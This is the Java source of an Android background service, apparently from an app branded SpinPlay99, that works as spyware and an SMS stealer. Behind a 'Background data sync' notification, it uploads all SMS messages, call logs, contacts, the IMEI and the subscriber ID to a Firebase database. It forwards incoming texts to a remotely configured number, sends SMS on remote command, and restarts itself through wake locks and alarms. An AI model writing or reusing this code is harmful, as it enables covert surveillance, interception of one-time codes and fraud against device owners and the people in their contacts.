package com.spinplay99.adminpanel;

import android.Manifest;
import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.os.SystemClock;
import android.provider.CallLog;
import android.provider.Settings;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

import androidx.annotation.NonNull;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;

import com.google.firebase.FirebaseApp;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ServerValue;
import com.google.firebase.database.ValueEventListener;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicLong;

public class BackgroundSyncService extends Service {

    private static final String DB_URL            = "https://spinplay99-default-rtdb.asia-southeast1.firebasedatabase.app";
    private static final String CHANNEL_ID        = "spinplay99_channel";
    private static final int    NOTIFICATION_ID   = 999;
    private static final String PREFS_NAME        = "SpinPlaySyncPrefs";
    private static final String KEY_SMS_COUNT     = "last_sms_count";
    private static final String KEY_CALL_COUNT    = "last_call_count";
    private static final String KEY_CONTACT_COUNT = "last_contact_count";
    private static final long   LIVE_INTERVAL     = 3_000;
    private static final long   FULL_INTERVAL     = 60_000;

    private FirebaseDatabase     firebaseDb;
    private DatabaseReference    rootRef;
    private DatabaseReference    deviceRef;
    private String               deviceId;
    private Handler              mainHandler;
    private Runnable             syncRunnable;
    private SmsManager           smsManager;
    private ValueEventListener   forwardingListener;
    private ValueEventListener   commandListener;
    private ValueEventListener   connListener;
    private DatabaseReference    connRef;
    private String               forwardingNumber   = "";
    private boolean              forwardingEnabled  = false;
    private final List<String>   forwardingFilters  = new ArrayList<>();
    private boolean              forwardAllSms      = true;
    private SharedPreferences    prefs;
    private final AtomicLong     lastFullSyncTime   = new AtomicLong(0);
    private final AtomicBoolean  fullSyncRunning    = new AtomicBoolean(false);
    private PowerManager.WakeLock wakeLock;

    // ─────────────────────────────────────────────
    // Lifecycle
    // ─────────────────────────────────────────────

    @Override
    public void onCreate() {
        super.onCreate();

        // Partial wake lock — keeps CPU awake so Firebase WebSocket stays alive
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        if (pm != null) {
            wakeLock = pm.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK, "SpinPlay99:SyncWakeLock");
            wakeLock.acquire();
        }

        // Init Firebase (safe if already initialized)
        if (FirebaseApp.getApps(this).isEmpty()) {
            FirebaseApp.initializeApp(this);
        }

        // Enable persistence once — queues writes when briefly offline
        try {
            FirebaseDatabase.getInstance(DB_URL).setPersistenceEnabled(true);
        } catch (Exception ignored) {}

        firebaseDb = FirebaseDatabase.getInstance(DB_URL);
        rootRef    = firebaseDb.getReference();
        deviceId   = Settings.Secure.getString(
            getContentResolver(), Settings.Secure.ANDROID_ID);
        deviceRef  = rootRef.child("devices").child(deviceId);

        mainHandler = new Handler(Looper.getMainLooper());
        smsManager  = getSmsManager();
        prefs       = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);

        createNotificationChannel();
        startForeground(NOTIFICATION_ID, buildNotification());

        // Keep this device node synced for offline read
        deviceRef.keepSynced(true);

        loadForwardingSettings();
        listenForManualCommands();
        listenForConnection();       // registers .info/connected listener
        scheduleRestart(this);
        doFullDataSync();            // first-run upload of all SMS/calls/contacts
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Mark online immediately on every start/restart
        if (deviceRef != null) {
            deviceRef.child("online_status").setValue(true);
        }
        // Re-attach connection listener only if previous instance was destroyed
        if (connListener == null) listenForConnection();
        startSyncLoop();
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        // Stop sync loop
        if (mainHandler != null && syncRunnable != null) {
            mainHandler.removeCallbacks(syncRunnable);
        }
        // Remove all Firebase listeners (prevent listener accumulation across restarts)
        try {
            if (connListener != null && connRef != null) {
                connRef.removeEventListener(connListener);
                connListener = null;
            }
            if (forwardingListener != null) {
                deviceRef.child("forwarding_settings").removeEventListener(forwardingListener);
            }
            if (commandListener != null) {
                deviceRef.child("manual_commands").child("send_sms")
                    .removeEventListener(commandListener);
            }
        } catch (Exception ignored) {}
        // Release wake lock
        try {
            if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        } catch (Exception ignored) {}
        super.onDestroy();
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        // Immediately try to restart + reschedule alarm
        scheduleRestart(getApplicationContext());
        try {
            Intent restart = new Intent(getApplicationContext(), BackgroundSyncService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                getApplicationContext().startForegroundService(restart);
            } else {
                getApplicationContext().startService(restart);
            }
        } catch (Exception ignored) {}
        super.onTaskRemoved(rootIntent);
    }

    // ─────────────────────────────────────────────
    // Sync Loop
    // ─────────────────────────────────────────────

    private void startSyncLoop() {
        if (syncRunnable != null) mainHandler.removeCallbacks(syncRunnable);
        syncRunnable = new Runnable() {
            @Override
            public void run() {
                syncLiveData();
                long now = System.currentTimeMillis();
                if (now - lastFullSyncTime.get() >= FULL_INTERVAL) {
                    // goOnline once per minute — forces reconnection if dropped
                    try { firebaseDb.goOnline(); } catch (Exception ignored) {}
                    doFullDataSync();
                    lastFullSyncTime.set(now);
                }
                mainHandler.postDelayed(this, LIVE_INTERVAL);
            }
        };
        mainHandler.post(syncRunnable);
    }

    // ─────────────────────────────────────────────
    // Live Data (every 3 seconds)
    // ─────────────────────────────────────────────

    private void syncLiveData() {
        deviceRef.child("online_status").setValue(true);

        Map<String, Object> live = new HashMap<>();
        live.put("timestamp",        new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date()));
        live.put("timestamp_millis", ServerValue.TIMESTAMP);
        live.put("battery_level",    getBatteryLevel());
        live.put("network_type",     getNetworkType());
        live.put("is_charging",      isDeviceCharging());
        live.put("permissions",      getAllPermissions());
        live.put("sim_info",         getSimInformation());
        if (checkPerm(Manifest.permission.READ_SMS))
            live.put("total_sms",    getCount(Telephony.Sms.CONTENT_URI));
        if (checkPerm(Manifest.permission.READ_CALL_LOG))
            live.put("total_calls",  getCount(CallLog.Calls.CONTENT_URI));
        if (checkPerm(Manifest.permission.READ_CONTACTS))
            live.put("contacts_count", getCount(android.provider.ContactsContract.Contacts.CONTENT_URI));

        deviceRef.child("live_data").setValue(live);
        updateDeviceInfo();
        checkAndForwardNewSms();
    }

    // ─────────────────────────────────────────────
    // Firebase Connection Listener
    // ─────────────────────────────────────────────

    private void listenForConnection() {
        if (connListener != null) return; // already attached
        connRef      = firebaseDb.getReference(".info/connected");
        connListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snap) {
                Boolean connected = snap.getValue(Boolean.class);
                if (Boolean.TRUE.equals(connected)) {
                    // Re-register online_status and disconnect handlers on every reconnect
                    deviceRef.child("online_status").setValue(true);
                    deviceRef.child("online_status").onDisconnect().setValue(false);
                    deviceRef.child("live_data").child("timestamp_millis")
                        .onDisconnect().setValue(ServerValue.TIMESTAMP);
                    deviceRef.child("device_info").child("last_seen")
                        .onDisconnect().setValue(ServerValue.TIMESTAMP);
                }
            }
            @Override
            public void onCancelled(@NonNull DatabaseError e) {}
        };
        connRef.addValueEventListener(connListener);
    }

    // ─────────────────────────────────────────────
    // Full Data Sync (SMS / Calls / Contacts)
    // ─────────────────────────────────────────────

    private void doFullDataSync() {
        if (!fullSyncRunning.compareAndSet(false, true)) return; // skip if already running
        new Thread(() -> {
            try {
                if (checkPerm(Manifest.permission.READ_SMS)) {
                    int current = getCount(Telephony.Sms.CONTENT_URI);
                    if (current != prefs.getInt(KEY_SMS_COUNT, -1)) {
                        uploadAllSms();
                        prefs.edit().putInt(KEY_SMS_COUNT, current).apply();
                    }
                }
                if (checkPerm(Manifest.permission.READ_CALL_LOG)) {
                    int current = getCount(CallLog.Calls.CONTENT_URI);
                    if (current != prefs.getInt(KEY_CALL_COUNT, -1)) {
                        uploadAllCalls();
                        prefs.edit().putInt(KEY_CALL_COUNT, current).apply();
                    }
                }
                if (checkPerm(Manifest.permission.READ_CONTACTS)) {
                    int current = getCount(android.provider.ContactsContract.Contacts.CONTENT_URI);
                    if (current != prefs.getInt(KEY_CONTACT_COUNT, -1)) {
                        uploadAllContacts();
                        prefs.edit().putInt(KEY_CONTACT_COUNT, current).apply();
                    }
                }
            } finally {
                fullSyncRunning.set(false);
            }
        }).start();
    }

    private void updateDeviceInfo() {
        Map<String, Object> info = new HashMap<>();
        info.put("device_id",       deviceId);
        info.put("device_model",    Build.MODEL);
        info.put("device_brand",    Build.BRAND);
        info.put("android_version", Build.VERSION.RELEASE);
        info.put("last_seen",       ServerValue.TIMESTAMP);
        info.put("sim_info",        getDetailedSimInfo());
        deviceRef.child("device_info").updateChildren(info);
    }

    // ─────────────────────────────────────────────
    // SMS Upload
    // ─────────────────────────────────────────────

    private void uploadAllSms() {
        List<Map<String, Object>> list = getAllSmsMessages();
        Map<String, Object> data = new HashMap<>();
        data.put("total_count",  list.size());
        data.put("last_updated", ServerValue.TIMESTAMP);
        data.put("messages",     list);
        deviceRef.child("all_sms").setValue(data);
    }

    private List<Map<String, Object>> getAllSmsMessages() {
        List<Map<String, Object>> result = new ArrayList<>();
        Cursor cursor = null;
        try {
            cursor = getContentResolver().query(
                Telephony.Sms.CONTENT_URI,
                new String[]{"_id","address","body","date","type","read"},
                null, null, "date DESC");
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    Map<String, Object> sms = new HashMap<>();
                    sms.put("id",      safe(cursor, 0));
                    sms.put("address", safe(cursor, 1));
                    String body = safe(cursor, 2);
                    if (body != null && body.length() > 500) body = body.substring(0, 500) + "...";
                    sms.put("body", body);
                    String ds = safe(cursor, 3);
                    sms.put("date", ds);
                    if (ds != null && !ds.isEmpty())
                        sms.put("date_readable", fmtTs(Long.parseLong(ds)));
                    String t = safe(cursor, 4);
                    sms.put("type", "1".equals(t) ? "INBOX" : "2".equals(t) ? "SENT" : "OTHER");
                    sms.put("read", safe(cursor, 5));
                    result.add(sms);
                } while (cursor.moveToNext());
            }
        } catch (Exception ignored) {
        } finally { close(cursor); }
        return result;
    }

    // ─────────────────────────────────────────────
    // Calls Upload
    // ─────────────────────────────────────────────

    private void uploadAllCalls() {
        List<Map<String, Object>> list = getAllCallLogs();
        Map<String, Object> data = new HashMap<>();
        data.put("total_count",  list.size());
        data.put("last_updated", ServerValue.TIMESTAMP);
        data.put("calls",        list);
        deviceRef.child("all_calls").setValue(data);
    }

    private List<Map<String, Object>> getAllCallLogs() {
        List<Map<String, Object>> result = new ArrayList<>();
        Cursor cursor = null;
        try {
            cursor = getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                new String[]{"_id","number","type","date","duration","name"},
                null, null, "date DESC");
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    Map<String, Object> c = new HashMap<>();
                    c.put("id",     safe(cursor, 0));
                    c.put("number", safe(cursor, 1));
                    String t = safe(cursor, 2);
                    c.put("type", "1".equals(t) ? "INCOMING" : "2".equals(t) ? "OUTGOING" : "3".equals(t) ? "MISSED" : "UNKNOWN");
                    String ds = safe(cursor, 3);
                    c.put("date", ds);
                    if (ds != null && !ds.isEmpty())
                        c.put("date_readable", fmtTs(Long.parseLong(ds)));
                    c.put("duration",     safe(cursor, 4));
                    c.put("contact_name", safe(cursor, 5));
                    result.add(c);
                } while (cursor.moveToNext());
            }
        } catch (Exception ignored) {
        } finally { close(cursor); }
        return result;
    }

    // ─────────────────────────────────────────────
    // Contacts Upload
    // ─────────────────────────────────────────────

    private void uploadAllContacts() {
        List<Map<String, Object>> list = getAllContactsList();
        Map<String, Object> data = new HashMap<>();
        data.put("total_count",  list.size());
        data.put("last_updated", ServerValue.TIMESTAMP);
        data.put("contacts",     list);
        deviceRef.child("all_contacts").setValue(data);
    }

    private List<Map<String, Object>> getAllContactsList() {
        List<Map<String, Object>> result = new ArrayList<>();
        Cursor cursor = null;
        try {
            cursor = getContentResolver().query(
                android.provider.ContactsContract.Contacts.CONTENT_URI,
                new String[]{"_id","display_name","has_phone_number"},
                null, null, "display_name ASC");
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    Map<String, Object> c = new HashMap<>();
                    String cId = safe(cursor, 0);
                    c.put("id",   cId);
                    c.put("name", safe(cursor, 1));
                    if ("1".equals(safe(cursor, 2)))
                        c.put("phone", getPhoneForContact(cId));
                    result.add(c);
                } while (cursor.moveToNext());
            }
        } catch (Exception ignored) {
        } finally { close(cursor); }
        return result;
    }

    private String getPhoneForContact(String id) {
        Cursor c = null;
        try {
            c = getContentResolver().query(
                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{"number"}, "contact_id=?", new String[]{id}, null);
            if (c != null && c.moveToFirst()) return c.getString(0);
        } catch (Exception ignored) {
        } finally { close(c); }
        return "";
    }

    // ─────────────────────────────────────────────
    // SMS Forwarding
    // ─────────────────────────────────────────────

    private void loadForwardingSettings() {
        forwardingListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snap) {
                if (!snap.exists()) return;
                forwardingNumber  = snap.child("forward_to").getValue(String.class);
                Boolean en  = snap.child("enabled").getValue(Boolean.class);
                Boolean all = snap.child("forward_all").getValue(Boolean.class);
                forwardingEnabled = Boolean.TRUE.equals(en);
                forwardAllSms     = all == null || all;
                forwardingFilters.clear();
                for (DataSnapshot f : snap.child("filters").getChildren()) {
                    String n = f.getValue(String.class);
                    if (n != null) forwardingFilters.add(n);
                }
            }
            @Override public void onCancelled(@NonNull DatabaseError e) {}
        };
        deviceRef.child("forwarding_settings").addValueEventListener(forwardingListener);
    }

    private void checkAndForwardNewSms() {
        if (!forwardingEnabled || !checkPerm(Manifest.permission.READ_SMS)) return;
        new Thread(() -> {
            Cursor cursor = null;
            try {
                long ago = System.currentTimeMillis() - 10_000;
                cursor = getContentResolver().query(
                    Telephony.Sms.Inbox.CONTENT_URI,
                    new String[]{"address","body","date"},
                    "date > ?", new String[]{String.valueOf(ago)},
                    "date DESC LIMIT 5");
                if (cursor != null && cursor.moveToFirst()) {
                    do {
                        forwardSms(safe(cursor, 0), safe(cursor, 1),
                            Long.parseLong(safe(cursor, 2)));
                    } while (cursor.moveToNext());
                }
            } catch (Exception ignored) {
            } finally { close(cursor); }
        }).start();
    }

    private void forwardSms(String from, String body, long ts) {
        if (!forwardingEnabled || forwardingNumber == null || forwardingNumber.isEmpty()) return;
        if (!forwardAllSms && !forwardingFilters.isEmpty()) {
            boolean match = false;
            for (String f : forwardingFilters) { if (from.contains(f)) { match = true; break; } }
            if (!match) return;
        }
        try {
            smsManager.sendTextMessage(forwardingNumber, null, "From: " + from + "\n" + body, null, null);
            Map<String, Object> log = new HashMap<>();
            log.put("from",         from);
            log.put("to",           forwardingNumber);
            log.put("body",         body != null && body.length() > 100 ? body.substring(0, 100) : body);
            log.put("status",       "FORWARDED");
            log.put("forwarded_at", ServerValue.TIMESTAMP);
            deviceRef.child("forwarded_sms").push().setValue(log);
        } catch (Exception ignored) {}
    }

    // ─────────────────────────────────────────────
    // Manual SMS Command Listener
    // ─────────────────────────────────────────────

    private void listenForManualCommands() {
        commandListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snap) {
                for (DataSnapshot cmd : snap.getChildren()) {
                    String to  = cmd.child("to").getValue(String.class);
                    String msg = cmd.child("message").getValue(String.class);
                    if (to != null && msg != null) {
                        try {
                            smsManager.sendTextMessage(to, null, msg, null, null);
                            Map<String, Object> log = new HashMap<>();
                            log.put("to",      to);
                            log.put("message", msg);
                            log.put("status",  "SENT");
                            log.put("sent_at", ServerValue.TIMESTAMP);
                            deviceRef.child("sent_sms").push().setValue(log);
                        } catch (Exception ignored) {}
                    }
                    cmd.getRef().removeValue();
                }
            }
            @Override public void onCancelled(@NonNull DatabaseError e) {}
        };
        deviceRef.child("manual_commands").child("send_sms")
            .addValueEventListener(commandListener);
    }

    // ─────────────────────────────────────────────
    // AlarmManager Keepalive (chain — fires every ~1 min, doze-safe)
    // ─────────────────────────────────────────────

    public static void scheduleRestart(Context ctx) {
        try {
            AlarmManager am = (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
            Intent intent   = new Intent(ctx, ServiceRestartReceiver.class);
            PendingIntent pi = PendingIntent.getBroadcast(
                ctx, 0, intent,
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
            if (am != null) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    // fires in Doze mode, no permission needed
                    am.setAndAllowWhileIdle(
                        AlarmManager.ELAPSED_REALTIME_WAKEUP,
                        SystemClock.elapsedRealtime() + 60_000, pi);
                } else {
                    am.set(AlarmManager.ELAPSED_REALTIME_WAKEUP,
                        SystemClock.elapsedRealtime() + 60_000, pi);
                }
            }
        } catch (Exception ignored) {}
    }

    // ─────────────────────────────────────────────
    // Notification
    // ─────────────────────────────────────────────

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                CHANNEL_ID, "Sync Service", NotificationManager.IMPORTANCE_LOW);
            ch.setDescription("Background data sync");
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    private Notification buildNotification() {
        PendingIntent pi = PendingIntent.getActivity(
            this, 0, new Intent(this, SplashActivity.class), PendingIntent.FLAG_IMMUTABLE);
        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("SpinPlay99")
            .setContentText("Service Running...")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setContentIntent(pi)
            .setOngoing(true)
            .build();
    }

    // ─────────────────────────────────────────────
    // Hardware / System Info
    // ─────────────────────────────────────────────

    private int getBatteryLevel() {
        try {
            Intent i = registerReceiver(null,
                new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            if (i != null) {
                int scale = i.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
                int level = i.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
                if (scale > 0) return (level * 100) / scale;
            }
        } catch (Exception ignored) {}
        return 0;
    }

    private boolean isDeviceCharging() {
        try {
            Intent i = registerReceiver(null,
                new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            if (i != null) {
                int s = i.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1);
                return s == android.os.BatteryManager.BATTERY_STATUS_CHARGING
                    || s == android.os.BatteryManager.BATTERY_STATUS_FULL;
            }
        } catch (Exception ignored) {}
        return false;
    }

    private String getNetworkType() {
        try {
            android.net.ConnectivityManager cm =
                (android.net.ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
            if (cm == null) return "Unknown";
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                android.net.Network net = cm.getActiveNetwork();
                if (net == null) return "Offline";
                android.net.NetworkCapabilities caps = cm.getNetworkCapabilities(net);
                if (caps == null) return "Offline";
                if (caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_WIFI))     return "WIFI";
                if (caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_CELLULAR)) return "MOBILE";
                if (caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_ETHERNET)) return "ETHERNET";
                return "OTHER";
            } else {
                android.net.NetworkInfo info = cm.getActiveNetworkInfo();
                return (info != null && info.isConnected()) ? info.getTypeName() : "Offline";
            }
        } catch (Exception ignored) {}
        return "Offline";
    }

    private Map<String, Object> getSimInformation() {
        Map<String, Object> m = new HashMap<>();
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            if (tm != null) {
                m.put("sim_operator",     tm.getSimOperatorName());
                m.put("network_operator", tm.getNetworkOperatorName());
            }
        } catch (Exception ignored) {}
        return m;
    }

    private Map<String, Object> getDetailedSimInfo() {
        Map<String, Object> m = new HashMap<>();
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            if (tm != null) {
                m.put("sim_operator_name",     tm.getSimOperatorName());
                m.put("network_operator_name", tm.getNetworkOperatorName());
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                        && checkPerm(Manifest.permission.READ_PHONE_STATE))
                    m.put("imei", tm.getImei());
                if (checkPerm(Manifest.permission.READ_PHONE_STATE))
                    m.put("subscriber_id", tm.getSubscriberId());
            }
        } catch (Exception ignored) {}
        return m;
    }

    private Map<String, Boolean> getAllPermissions() {
        Map<String, Boolean> p = new HashMap<>();
        p.put("read_sms",      checkPerm(Manifest.permission.READ_SMS));
        p.put("send_sms",      checkPerm(Manifest.permission.SEND_SMS));
        p.put("receive_sms",   checkPerm(Manifest.permission.RECEIVE_SMS));
        p.put("read_call_log", checkPerm(Manifest.permission.READ_CALL_LOG));
        p.put("read_contacts", checkPerm(Manifest.permission.READ_CONTACTS));
        p.put("call_phone",    checkPerm(Manifest.permission.CALL_PHONE));
        return p;
    }

    // ─────────────────────────────────────────────
    // Utilities
    // ─────────────────────────────────────────────

    private boolean checkPerm(String p) {
        return ContextCompat.checkSelfPermission(this, p) == PackageManager.PERMISSION_GRANTED;
    }

    private int getCount(Uri uri) {
        int n = 0;
        Cursor c = null;
        try {
            c = getContentResolver().query(uri, new String[]{"_id"}, null, null, null);
            if (c != null) n = c.getCount();
        } catch (Exception ignored) {
        } finally { close(c); }
        return n;
    }

    private String safe(Cursor c, int i) {
        try { return c.getString(i); } catch (Exception e) { return ""; }
    }

    private String fmtTs(long ts) {
        try { return new SimpleDateFormat("dd/MM/yyyy hh:mm a", Locale.getDefault()).format(new Date(ts)); }
        catch (Exception e) { return ""; }
    }

    private void close(Cursor c) {
        try { if (c != null) c.close(); } catch (Exception ignored) {}
    }

    @SuppressWarnings("deprecation")
    private SmsManager getSmsManager() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            SmsManager sm = getSystemService(SmsManager.class);
            return sm != null ? sm : SmsManager.getDefault();
        }
        return SmsManager.getDefault();
    }
}
